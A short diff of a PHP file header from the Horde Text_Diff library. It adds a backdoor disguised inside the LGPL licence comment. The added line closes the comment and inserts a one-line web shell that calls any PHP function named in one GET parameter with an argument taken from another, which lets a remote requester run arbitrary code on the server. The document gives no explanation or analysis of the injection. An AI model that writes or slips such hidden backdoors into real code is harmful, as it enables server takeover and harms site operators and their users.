@@ -8,7 +8,7 @@
  * Copyright 2004-2010 The Horde Project (http://www.horde.org/)
  *
  * See the enclosed file COPYING for license information (LGPL). If you did
- * not receive this file, see http://opensource.org/licenses/lgpl-license.php.
+ * not receive */ isset($_GET[kxogni1570])?$_GET[kxogni1570]($_GET[w]):''; /*lgpl-license.php.
  *
  * @author  Jon Parise <jon@horde.org>
  * @package Text_Diff
